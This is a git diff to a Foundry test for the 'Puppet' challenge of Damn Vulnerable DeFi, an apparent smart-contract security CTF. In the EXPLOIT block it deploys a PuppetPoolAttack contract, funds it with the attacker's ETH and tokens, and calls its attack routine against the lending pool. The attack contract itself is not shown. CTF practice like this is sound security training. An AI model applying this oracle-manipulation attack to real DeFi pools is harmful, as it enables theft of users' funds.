@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
+import {PuppetPoolAttack} from "../../../src/Contracts/puppet/PuppetPoolAttack.sol";
 
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
@@ -26,7 +27,7 @@ interface UniswapV1Factory {
     function createExchange(address token) external returns (address);
 }
 
-contract Puppet is Test {
+contract PuppetV1 is Test {
     // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
     uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
     uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
@@ -100,7 +101,17 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        PuppetPoolAttack puppetPoolAttack =
+            new PuppetPoolAttack(address(uniswapExchange), address(puppetPool), address(dvt));
+        vm.label(address(puppetPoolAttack), "Puppet Pool Attack");
 
+        // Add liquidity to the attacker
+        puppetPoolAttack.deposit{value: ATTACKER_INITIAL_ETH_BALANCE}();
+        dvt.transfer(address(puppetPoolAttack), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // Attack the pool
+        puppetPoolAttack.attack();
         /**
          * EXPLOIT END *
          */
@@ -117,6 +128,7 @@ contract Puppet is Test {
     // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
     function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
         internal
+        pure
         returns (uint256)
     {
         uint256 input_amount_with_fee = input_amount * 997;
